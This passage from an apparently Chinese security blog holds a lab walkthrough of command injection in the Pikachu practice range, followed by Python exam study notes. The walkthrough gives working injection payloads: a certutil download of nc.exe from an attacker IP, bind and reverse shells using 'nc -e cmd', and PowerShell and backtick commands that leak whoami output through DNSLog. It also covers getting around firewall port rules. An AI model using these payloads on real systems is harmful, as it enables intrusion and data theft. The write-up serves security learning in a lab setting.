class="line">ping -c 1 127.0.0.1 &amp;&amp; <span class="built_in">whoami</span></span><br><span class="line">ping -c 1 127.0.0.1 `<span class="built_in">whoami</span>`</span><br></pre></td></tr></table></figure><h1 id="漏洞利用：反弹shell"><a href="#漏洞利用：反弹shell" class="headerlink" title="漏洞利用：反弹shell"></a>漏洞利用：反弹shell</h1><h2 id="上传nc-exe到指定目录下"><a href="#上传nc-exe到指定目录下" class="headerlink" title="上传nc.exe到指定目录下"></a>上传nc.exe到指定目录下</h2><p>换个视角来说，就是对面服务器在下载文件。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入下面的命令，使得其返回主机名</span></span><br><span class="line">127.0.0.1|<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="c2.jpg" alt="主机名"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Windows服务器没有nc</span></span><br><span class="line"><span class="comment"># 尝试利用cmd的管道漏洞让目标服务器通过cmd自动下载nc.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 具体下载命令见菱角社区</span></span><br><span class="line"><span class="comment"># 192.168.1.101:8023    已经放置nc工具的服务器</span></span><br><span class="line"><span class="comment"># C:/nc.exe             在服务器挑选好位置放置nc</span></span><br><span class="line">127.0.0.1 | certutil.exe -urlcache -<span class="built_in">split</span> -f http://192.168.1.101:8034/nc.exe C:\\nc.exe</span><br></pre></td></tr></table></figure><h2 id="获取网卡IP"><a href="#获取网卡IP" class="headerlink" title="获取网卡IP"></a>获取网卡IP</h2><p>下载完成后，尝试获取对面的IP地址。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Windows IP ����</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">��̫�������� Ethernet0:</span><br><span class="line"></span><br><span class="line">   �����ض��� DNS ��׺ . . . . . . . : localdomain</span><br><span class="line">   �������� IPv6 ��ַ. . . . . . . . : fe80::355b:6b2:bede:3905%15</span><br><span class="line">   IPv4 ��ַ . . . . . . . . . . . . : 192.168.59.129</span><br><span class="line">   ��������  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Ĭ������. . . . . . . . . . . . . : </span><br><span class="line"></span><br><span class="line">��̫�������� Ethernet1:</span><br><span class="line"></span><br><span class="line">   �����ض��� DNS ��׺ . . . . . . . : </span><br><span class="line">   �������� IPv6 ��ַ. . . . . . . . : fe80::2c3a:5d98:3e93:f708%12</span><br><span class="line">   IPv4 ��ַ . . . . . . . . . . . . : 192.168.1.102</span><br><span class="line">   ��������  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Ĭ������. . . . . . . . . . . . . : 192.168.1.1</span><br><span class="line"></span><br><span class="line">��̫�������� Ethernet2:</span><br><span class="line"></span><br><span class="line">   �����ض��� DNS ��׺ . . . . . . . : localdomain</span><br><span class="line">   �������� IPv6 ��ַ. . . . . . . . : fe80::19b8:ec37:2753:f3fc%29</span><br><span class="line">   IPv4 ��ַ . . . . . . . . . . . . : 192.168.232.193</span><br><span class="line">   ��������  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Ĭ������. . . . . . . . . . . . . : 192.168.232.2</span><br><span class="line"></span><br><span class="line">��̫�������� Npcap Loopback Adapter:</span><br><span class="line"></span><br><span class="line">   �����ض��� DNS ��׺ . . . . . . . : </span><br><span class="line">   �������� IPv6 ��ַ. . . . . . . . : fe80::e4e3:6d3f:5e8e:a5f2%39</span><br><span class="line">   �Զ����� IPv4 ��ַ  . . . . . . . : 169.254.165.242</span><br><span class="line">   ��������  . . . . . . . . . . . . : 255.255.0.0</span><br><span class="line">   Ĭ������. . . . . . . . . . . . . : </span><br></pre></td></tr></table></figure><p>获得对面服务器的shell</p><h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h2><p>服务器绑定监听端口，攻击端连接到服务器ip地址获取shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 绑定服务器CMD到目标5566端口</span></span><br><span class="line">127.0.0.1 | C:\\nc -e cmd -lvvp 5566</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击端连接服务器</span></span><br><span class="line"><span class="comment"># CMD输入下面的命令</span></span><br><span class="line"><span class="comment"># 下面的命令IP地址是服务端的</span></span><br><span class="line">ncat 192.168.59.129 5566</span><br></pre></td></tr></table></figure><p><img src="c4.jpg" alt="攻击端连接视角"></p><h2 id="逆向连接"><a href="#逆向连接" class="headerlink" title="逆向连接"></a>逆向连接</h2><p>服务器主动给出权限到指定的远程攻击端IP地址和端口，远程攻击端监听端口即可连接服务器shell。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击端优先打开端口监听</span></span><br><span class="line">ncat -lvvp 5566</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务端主动给出shell到指定IP地址+端口</span></span><br><span class="line">127.0.0.1|C:\\nc.exe cmd -e 192.168.1.101 5566</span><br></pre></td></tr></table></figure><p><img src="c5.jpg" alt="攻击端监听控制效果"></p><hr><h1 id="开启防火墙-组策略-下的ping窗口"><a href="#开启防火墙-组策略-下的ping窗口" class="headerlink" title="开启防火墙(组策略)下的ping窗口"></a>开启防火墙(组策略)下的ping窗口</h1><h2 id="入站限制5566"><a href="#入站限制5566" class="headerlink" title="入站限制5566"></a>入站限制5566</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>场景：限制入栈的5566端口(TCP)</p><p>影响：外部主机无法通过5566端口直接连接内网主机。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 说白了，攻击机主动连接</span></span><br><span class="line">ncat 192.168.59.129 5566</span><br><span class="line"><span class="comment"># 的命令无法使用了。</span></span><br></pre></td></tr></table></figure><p><img src="c7.jpg" alt="防火墙限制5566入站"></p><h3 id="无法直接连接的解决办法"><a href="#无法直接连接的解决办法" class="headerlink" title="无法直接连接的解决办法"></a>无法直接连接的解决办法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解决办法其实前面提到过，把主机的权限给出去</span></span><br><span class="line"><span class="comment"># 主动给到远程的攻击机，限制入栈5566端口的情况就能解决了(除非出站5566端口也被封禁了……)</span></span><br></pre></td></tr></table></figure><p>使服务器主动从出站5566端口给出shell，避开入栈5566端口的封禁</p><p><img src="c6.jpg" alt="规避服务器入站5566的出站5566"></p><h2 id="出站5566端口限制"><a href="#出站5566端口限制" class="headerlink" title="出站5566端口限制"></a>出站5566端口限制</h2><h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><p>场景：服务端入站5566端口不做限制，仅限制出站5566端口。</p><p>影响：服务端无法主动给出5566端口。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 说白了，就是服务端5566端口给不出去了，得靠攻击机自己去找入站的5566端口进行连接。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows server防火墙策略：</span></span><br><span class="line">进入服务器的限制比较严密，出站规则比较宽松。</span><br><span class="line">当出站的5566被封后，入站的5566即使没有设置也会失效。（少见）</span><br><span class="line">这种情况下，仅仅允许设置的流量入站，而5566在设置出站封禁时，是没有设置入站放行的。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为了做正反向实验，先配置一个放行5566端口的入站规则</span></span><br></pre></td></tr></table></figure><p><img src="c8.jpg" alt="出站5566限制"></p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为了做正反向实验，先配置一个放行5566端口的入站规则</span></span><br><span class="line"><span class="comment"># 服务端绑定端口等待连接</span></span><br><span class="line">127.0.0.1|C:\\nc.exe cmd -e -lvvp 5566</span><br><span class="line"><span class="comment"># 攻击机连接主机</span></span><br><span class="line">ncat 192.168.59.129 5566</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="数据无回显-gt-使用带外查询"><a href="#数据无回显-gt-使用带外查询" class="headerlink" title="数据无回显-&gt;使用带外查询"></a>数据无回显-&gt;使用带外查询</h1><p>执行完命令页面不回显，不确定的情况下使用带外查询。</p><p><img src="c9.jpg" alt="ping命令回显禁用"></p><p>数据不回显：</p><p>1、反弹shell<br>2、带外查询<br>   <a href="http://dnslog.cn/">DNSLog</a> 可以使用Linux系统在ping状态下使用``调用命令。<br>   针对Windows系统：命令行进入powershell框架</p><h2 id="针对Windows服务器的带外查询"><a href="#针对Windows服务器的带外查询" class="headerlink" title="针对Windows服务器的带外查询"></a>针对Windows服务器的带外查询</h2><p>带外查询(个人理解)符合以下情况：</p><ul><li>能执行ping命令、</li><li>没有封锁管道服务</li><li>没有明显的数据回显</li></ul><p>带外查询的办法：前往 <a href="http://dnslog.cn/">DNSLog</a>网站进行查询。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 此场基于皮卡皮卡靶场的ping命令部分</span></span><br><span class="line"><span class="comment"># 具体查询步骤：</span></span><br><span class="line"><span class="comment"># 1.使用DNSlog生成一个域名</span></span><br><span class="line">点击get subdomain获取一个域名</span><br><span class="line"><span class="comment"># 2.使用靶场的ping命令ping这个域名时，主机的ping信息会被DNSlog记录</span></span><br><span class="line">这里加上管道，结合ping命令和powershell进行查询.</span><br><span class="line">如下:</span><br><span class="line">ping 127.0.0.1|powershell <span class="variable">$x</span>=<span class="built_in">whoami</span>;<span class="variable">$x</span>.replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);<span class="variable">$y</span>=<span class="string">&#x27;.kayk1b.dnslog.cn&#x27;</span>;<span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;ping <span class="variable">$z</span></span><br><span class="line">稍微解读下：</span><br><span class="line">ping 127.0.0.1|   =&gt; ping命令和“或”管道符</span><br><span class="line">powershell        =&gt; 调用Windows的powershell</span><br><span class="line"><span class="variable">$x</span>=<span class="built_in">whoami</span>;<span class="variable">$x</span>.replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>); </span><br><span class="line">                  =&gt; 调用<span class="built_in">whoami</span>查询本机用户主体，并且替换掉查询出来的“\”</span><br><span class="line"><span class="variable">$y</span>=<span class="string">&#x27;.kayk1b.dnslog.cn&#x27;</span>;<span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;ping <span class="variable">$z</span></span><br><span class="line">                  =&gt; 获取dnslog的域名，并且将域名和<span class="variable">$x</span>的信息合并</span><br><span class="line"></span><br><span class="line">最后，在DNSlog.cn上点击Refresh Record刷新，就能查到你所需要的账户主体的名称</span><br></pre></td></tr></table></figure><blockquote><p>Windows的带外查询需要调用到Windows的powershell来查找主机的主体再拼接成ping命令，Linux能直接在ping命令上执行并且拼接字符串来返回信息，比Windows方便多了。</p></blockquote><h2 id="针对Linux服务器的带外查询"><a href="#针对Linux服务器的带外查询" class="headerlink" title="针对Linux服务器的带外查询"></a>针对Linux服务器的带外查询</h2><p>Linux就简单多了，只需获取带外查询的域名，使用如下的ping命令，再在DNSLOG那点击Refresh Record刷新就可以看到了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 环境仍然是基于皮卡皮卡靶场，只不过系统环境变更为Linux</span></span><br><span class="line">`<span class="built_in">whoami</span>`.kayk1b.dnslog.cn</span><br></pre></td></tr></table></figure><h1 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h1><p>ping命令走的是ICMP协议，防火墙拦截的是TCP和UDP协议</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
            <tag> 靶场 </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-Study-0006</title>
      <link href="/2023/03/24/Python-Study-0006/"/>
      <url>/2023/03/24/Python-Study-0006/</url>
      
        <content type="html"><![CDATA[<p>stu</p><span id="more"></span><h1 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h1><p>仅做错题和个人认为有用处的题目为记录</p><h2 id="套1"><a href="#套1" class="headerlink" title="套1"></a>套1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>某二叉树中有<span class="number">15</span>个度为<span class="number">1</span>的结点，<span class="number">16</span>个度为<span class="number">2</span>的结点，则该二叉树中总的结点数为（）</span><br><span class="line">A<span class="number">.32</span></span><br><span class="line">B<span class="number">.46</span> </span><br><span class="line">C<span class="number">.48</span> </span><br><span class="line">D<span class="number">.49</span></span><br><span class="line"></span><br><span class="line">答案：C</span><br><span class="line"></span><br><span class="line">在树结构中，一个结点所拥有的后件个数称为该结点的度，所有结点中最大的度称为树的度。对任何一棵二叉树，度为<span class="number">0</span>的结点（即叶子结点）总是比度为<span class="number">2</span>的结点多一个。由<span class="number">16</span>个度为<span class="number">2</span>的结点可知叶子结点个数为<span class="number">17</span>，则结点结点总数为<span class="number">16</span>+<span class="number">17</span>+<span class="number">15</span>=<span class="number">48</span>，所以选C。 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、下列叙述中错误的是()。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A.线性结构也能采用链式存储结构</span><br><span class="line"></span><br><span class="line">B.线性结构一定能采用顺序存储结构 </span><br><span class="line"></span><br><span class="line">C.有的非线性结构也能采用顺序存储结构 </span><br><span class="line"></span><br><span class="line">D.非线性结构一定不能采用顺序存储结构 </span><br><span class="line"></span><br><span class="line">答案：D</span><br><span class="line"></span><br><span class="line">满二叉树与完全二叉树均为非线性结构，但可以按照层次进行顺序存储。本题选择D选项。 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、软件的三要素是（）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A.程序、数据及相关文档</span><br><span class="line"></span><br><span class="line">B.程序、数据和配置 </span><br><span class="line"></span><br><span class="line">C.程序、数据和工具 </span><br><span class="line"></span><br><span class="line">D.程序、数据和运行环境</span><br><span class="line"></span><br><span class="line">答案：A</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、一个模块直接调用的下层模块的数目称为模块的()。</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">A.扇入数</span><br><span class="line"></span><br><span class="line">B.扇出数 </span><br><span class="line"></span><br><span class="line">C.宽度 </span><br><span class="line"></span><br><span class="line">D.作用域 </span><br><span class="line"></span><br><span class="line">答案：B</span><br><span class="line">【题目解析】</span><br><span class="line">扇入数指调用一个给定模块的模块个数。</span><br><span class="line">扇出数是指由一个模块直接调用的其他模块数，即一个模块直接调用的下层模块的数目。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">9</span>、在供应关系中,实体供应商和实体零件之间的联系是()。</span><br><span class="line">A.多对多</span><br><span class="line">B.一对一 </span><br><span class="line">C.多对一 </span><br><span class="line">D.一对多 </span><br><span class="line"></span><br><span class="line">答案：A   </span><br><span class="line">【题目解析】</span><br><span class="line">一家供应商可提供多种零件，一种零件也可被多家供应商提供。所以实体供应商和实体零件之间的联系是多对多。</span><br><span class="line"></span><br><span class="line"><span class="number">10</span>、将实体-联系模型转换为关系模型时，实体之间多对多联系在关系模型中的实现方式是（）。</span><br><span class="line">A.建立新的关系</span><br><span class="line">B.建立新的属性 </span><br><span class="line">C.增加新的关键字 </span><br><span class="line">D.建立新的实体</span><br><span class="line"></span><br><span class="line">答案：A  </span><br><span class="line">【题目解析】</span><br><span class="line">①一个实体型转换为一个关系模型，实体的属性就是关系的属性，实体的键就是关系的键。</span><br><span class="line">②一个联系转换为一个关系模式，与该联系相连的每个实体型的键以及联系的属性都转换为关系的属性。</span><br><span class="line">这个关系的键分为以下三种不同的情况：</span><br><span class="line">若联系为<span class="number">1</span>:<span class="number">1</span>，则相连的每个实体型的键均是该关系模式的候选键；</span><br><span class="line">若联系为<span class="number">1</span>:n，则联系对应的关系模式的键取n端实体型的键；</span><br><span class="line">若联系为m:n，则联系对应的关系模式的键为参加联系的诸实体型的键的组合</span><br><span class="line"></span><br><span class="line"><span class="number">11</span>、以下不属于程序语言设计语言类别的是()。</span><br><span class="line">A.解释语言</span><br><span class="line">B.汇编语言 </span><br><span class="line">C.机器语言 </span><br><span class="line">D.高级语言 </span><br><span class="line"></span><br><span class="line">答案：A  </span><br><span class="line">【题目解析】</span><br><span class="line">程序设计语言分为三类机器语言、汇编语言、高级语言。所以本题选A。</span><br><span class="line"></span><br><span class="line"><span class="number">13</span>、Python语言提供三种基本的数字类型,它们是()。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A.整数类型、二进制类型、浮点类型</span><br><span class="line">B.整数类型、浮点类型、复数类型 </span><br><span class="line">C.整数类型、二进制类型、复数类型 </span><br><span class="line">D.二进制类型、浮点类型、复数类型 </span><br><span class="line"></span><br><span class="line">答案：B   </span><br><span class="line"></span><br><span class="line"><span class="number">16</span>、下列关于列表的说法正确的是()。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A.列表的索引序号是从<span class="number">1</span>开始的,以此类推</span><br><span class="line">B.使用append()函数可以向列表的指定位置插入元素 </span><br><span class="line">C.列表中的值可以是任何数据类型,被称为元素或项 </span><br><span class="line">D.使用remove()函数可以从列表中删除元素,但必须知道元素在列表中的位置 </span><br><span class="line"></span><br><span class="line">答案：C   </span><br><span class="line">【题目解析】</span><br><span class="line">列表的序号是从<span class="number">0</span>开始的，append函数是向列表末尾插入元素，remove函数可直接删除参数元素，不需要知道所在位置。所以本题选C。 </span><br><span class="line"></span><br><span class="line"><span class="number">17</span>、当键盘输入<span class="number">3</span>的时候，下面输入正确的是()。</span><br><span class="line"></span><br><span class="line">r = <span class="built_in">input</span>(<span class="string">&quot;请输入半径：&quot;</span>)</span><br><span class="line">c = <span class="number">3.1415</span> * r *<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:.0f&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line"></span><br><span class="line">A.<span class="type">Type</span> Error</span><br><span class="line">B<span class="number">.18</span> </span><br><span class="line">C<span class="number">.18</span><span class="number">.849</span> </span><br><span class="line">D<span class="number">.19</span> </span><br><span class="line"></span><br><span class="line">答案：A  </span><br><span class="line">【题目解析】</span><br><span class="line"><span class="built_in">input</span>()函数返回的是字符串类型，当用户输入的是数字的时候，需要用<span class="built_in">eval</span>()或者<span class="built_in">float</span>()或者<span class="built_in">int</span>()转换成数值类型，才能参加运算。本题选A。</span><br><span class="line"></span><br><span class="line"><span class="number">22</span>、下面代码的输出结果是()。</span><br><span class="line"></span><br><span class="line">x=<span class="number">10</span></span><br><span class="line"><span class="keyword">while</span> x:</span><br><span class="line">    x-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(x,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">A<span class="number">.86420</span></span><br><span class="line">B<span class="number">.975311</span> </span><br><span class="line">C<span class="number">.97531</span> </span><br><span class="line">D<span class="number">.864200</span> </span><br><span class="line"></span><br><span class="line">【您的选择】C   </span><br><span class="line">【题目解析】</span><br><span class="line"><span class="keyword">while</span>条件为真时进入循环体,执行循环体中的内容。</span><br><span class="line">如果x的值为偶数则<span class="keyword">if</span>条件为假,不执行任何操作,为奇数则<span class="keyword">if</span>条件为真,输出该奇数;</span><br><span class="line">进入下一次循环,判断<span class="keyword">while</span>条件，判断是否进入循环体，执行循环体中的代码。</span><br><span class="line">后面的操作类似，直到<span class="keyword">while</span>条件不满足。经过一系列的运算，输出结果为: <span class="number">97531</span>。所以本题选C。 </span><br><span class="line"></span><br><span class="line"><span class="number">27</span>、以下关于文件读写的描述中,错误的是()。</span><br><span class="line"></span><br><span class="line">A.以追加模式打开的文件,文件存在则在原文件最后追加内容,不存在则创建</span><br><span class="line">B.对文件进行读写操作之后必须关闭文件以防止文件丢失 </span><br><span class="line">C.文件对象的seek()方法用来返回文件指针的当前位置 </span><br><span class="line">D.文件对象的readlines()方法用来读取文件中的所有行,以每行为元素形成一个列表 </span><br><span class="line"></span><br><span class="line">【您的选择】C   </span><br><span class="line">【题目解析】</span><br><span class="line">文件对象的seek方法用来移动指针的位置。所以本题选C。 </span><br><span class="line"></span><br><span class="line"><span class="number">29</span>、以下关于文件描述错误的是()。</span><br><span class="line"></span><br><span class="line">A.<span class="built_in">open</span> 函数的参数处理模式 ’ b ’ 表示以二进制数据处理文件</span><br><span class="line">B.<span class="built_in">open</span> 函数的参数处理模式 ’ + ’ 表示可以对文件进行读和写操作 </span><br><span class="line">C.readline 函数表示读取文件的下一行，返回一个字符串 </span><br><span class="line">D.<span class="built_in">open</span> 函数的参数处理模式 ’ a ’ 表示追加方式打开文件，删除已有内容 </span><br><span class="line"></span><br><span class="line">【您的选择】D  </span><br><span class="line">【题目解析】</span><br><span class="line">a的打开方式并不会删除掉原文件内容。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">31</span>、下面关于组合数据类型描述错误的是 ()。</span><br><span class="line"></span><br><span class="line">A.可以用大括号创建字典，用中括号增加新元素</span><br><span class="line">B.字典的 pop 函数可以返回一个键对应的值，并删除该键值对 </span><br><span class="line">C.空字典和空集合都可以用大括号来创建 </span><br><span class="line">D.嵌套的字典数据类型可以用来表达高维数据 </span><br><span class="line"></span><br><span class="line">【您的选择】C   </span><br><span class="line">【题目解析】</span><br><span class="line">字典可以用大括号来创建，集合只能用<span class="built_in">set</span>()函数来创建。嵌套字典可以实现高维数据。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">32</span>、不属于Python机器学习第三方库的是()。</span><br><span class="line"></span><br><span class="line">A.Pylons</span><br><span class="line">B.tensorflow </span><br><span class="line">C.keras </span><br><span class="line">D.mxnet </span><br><span class="line"></span><br><span class="line">【您的选择】A  </span><br><span class="line">【题目解析】</span><br><span class="line">keras、tensorflow、mxnet是机器学习的第三方库。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">34</span>、以下属于 Python HTML 和 XML 解析的第三方库的是()。</span><br><span class="line"></span><br><span class="line">A.Requests</span><br><span class="line">B.Networkx </span><br><span class="line">C.Beautiful Soup </span><br><span class="line">D.Django </span><br><span class="line"></span><br><span class="line">【您的选择】C 恭喜您答对了!  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">37</span>、以下程序输出到test.txt的结果是()。</span><br><span class="line"></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;text.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">x = [<span class="number">90</span>,<span class="number">87</span>,<span class="number">93</span>]</span><br><span class="line">fo. write(<span class="string">&quot;,&quot;</span>.join(<span class="built_in">str</span>(x)))</span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">A.[<span class="number">90</span>,<span class="number">87</span>,<span class="number">93</span>]</span><br><span class="line">B.,<span class="number">9</span>,<span class="number">0</span>,,, ,<span class="number">8</span>,<span class="number">7</span>,,, ,<span class="number">9</span>,<span class="number">3</span>, </span><br><span class="line">C<span class="number">.90</span>,<span class="number">87</span>,<span class="number">93</span> </span><br><span class="line">D.[,<span class="number">9</span>,<span class="number">0</span>,,, ,<span class="number">8</span>,<span class="number">7</span>,,, ,<span class="number">9</span>,<span class="number">3</span>,] </span><br><span class="line"></span><br><span class="line">【您的选择】D   </span><br><span class="line">【题目解析】</span><br><span class="line">本题将列表转换成字符串，join会将每一个字符用‘，’串起来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">38</span>、执行以下程序后,要输出my44py45结果,该执行的选项堤()。</span><br><span class="line"></span><br><span class="line">ls = [<span class="string">&#x27;my&#x27;</span>,<span class="string">&#x27;44&#x27;</span>,<span class="string">&#x27;py&#x27;</span>,<span class="string">&#x27;45&#x27;</span>]</span><br><span class="line">ls.reverse()</span><br><span class="line"></span><br><span class="line">A.<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(ls[-<span class="number">1</span>::-<span class="number">1</span>]))</span><br><span class="line">B.<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(ls)) </span><br><span class="line">C.<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(ls[<span class="number">1</span>:])) </span><br><span class="line">D.<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(ls[-<span class="number">1</span>::]))</span><br><span class="line"></span><br><span class="line">【您的选择】A   </span><br><span class="line">【题目解析】</span><br><span class="line">本题考查字符串的切片，reverse()方法将列表反转，此时列表为[<span class="string">&#x27;45&#x27;</span>,<span class="string">&#x27;py&#x27;</span>,<span class="string">&#x27;44&#x27;</span>,<span class="string">&#x27;my&#x27;</span>]，此时利用切片是列表再次倒过来即可满足条件。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">40</span>、下面这段代码的输出结果是()。</span><br><span class="line"></span><br><span class="line">L = <span class="string">&#x27;abcd&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x,result=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span>):</span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        result.remove(x[-<span class="number">1</span>])</span><br><span class="line">        f(x[:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="built_in">print</span>(f(L))</span><br><span class="line"></span><br><span class="line">A.[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">B.[<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>] </span><br><span class="line">C.[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>] </span><br><span class="line">D.[] </span><br><span class="line"></span><br><span class="line">【您的选择】D   </span><br><span class="line">【题目解析】</span><br><span class="line">本题考查函数的使用，调用函数是x=<span class="string">&#x27;abcd&#x27;</span>，只要x不为空，函数f()会被不断调用，直到x值为空，每次调用result都要删除掉x字符串的最后一位字符相等的值。最终列表也为空。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="卷2"><a href="#卷2" class="headerlink" title="卷2"></a>卷2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、下列叙述中正确的是（）。</span><br><span class="line"></span><br><span class="line">A.在栈中，栈中元素随栈底指针与栈顶指针的变化而动态变化</span><br><span class="line">B.在栈中，栈顶指针不变，栈中元素随栈底指针的变化而动态变化 </span><br><span class="line">C.在栈中，栈底指针不变，栈中元素随栈顶指针的变化而动态变化 </span><br><span class="line">D.以上说法均不正确</span><br><span class="line"></span><br><span class="line">【您的选择】C   </span><br><span class="line">【题目解析】</span><br><span class="line">在栈中，允许插入与删除的一端称为栈顶，而不允许插入与删除的另一端称为栈底。栈跟队列不同，元素只能在栈顶压入或弹出，栈底指针不变，栈中元素随栈顶指针的变化而动态变化，遵循后进先出的规则</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、循环队列的存储空间为Q(<span class="number">1</span>:<span class="number">50</span>)。经过一系列正常的入队与退队操作后,front=rear=<span class="number">25</span>。后又成功地将一个元素退队,此时队列中的元素个数为()。</span><br><span class="line"></span><br><span class="line">A<span class="number">.24</span></span><br><span class="line">B<span class="number">.49</span> </span><br><span class="line">C<span class="number">.26</span> </span><br><span class="line">D<span class="number">.0</span> </span><br><span class="line"></span><br><span class="line">【您的选择】B  </span><br><span class="line">【题目解析】</span><br><span class="line">当front=rear时可知队列要么为空要么队列满，题目又成功地将一个元素退队，说明之前队列为满（为空时队列中无元素），退出一个元素后队列中还有<span class="number">50</span>-<span class="number">1</span>=<span class="number">49</span>个元素。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、某二叉树共有<span class="number">730</span>个结点，其中度为<span class="number">1</span>的结点有<span class="number">30</span>个，则叶子结点个数为（）。</span><br><span class="line"></span><br><span class="line">A<span class="number">.351</span></span><br><span class="line">B<span class="number">.1</span> </span><br><span class="line">C<span class="number">.350</span> </span><br><span class="line">D.不存在这样的二叉树</span><br><span class="line"></span><br><span class="line">【您的选择】D  </span><br><span class="line">【题目解析】</span><br><span class="line">在二叉树中，</span><br><span class="line">总结点数=叶子结点数+度为<span class="number">1</span>的结点数+度为<span class="number">2</span>的结点数</span><br><span class="line">叶子节点数 等同于 度为<span class="number">0</span>的节点数</span><br><span class="line">度为<span class="number">0</span>和度为<span class="number">2</span>的结点，共有<span class="number">730</span>-<span class="number">30</span>=<span class="number">700</span>个，</span><br><span class="line">而二叉树又有如下性质：</span><br><span class="line">    在任意一棵二叉树中，度为<span class="number">0</span>的结点(即叶子结点)总是比度为<span class="number">2</span>的结点多一个。</span><br><span class="line">所以度为<span class="number">0</span>的结点个数加上度为<span class="number">2</span>的结点个数之和一定是奇数，不可能是<span class="number">700</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、给出二叉树前序序列为ABDEGCFH，中序序列为DBGEAFHC，则该二叉树后序序列为</span><br><span class="line"></span><br><span class="line">A.ABDEGCFH</span><br><span class="line">B.DBGEAFHC </span><br><span class="line">C.DGEBHFCA </span><br><span 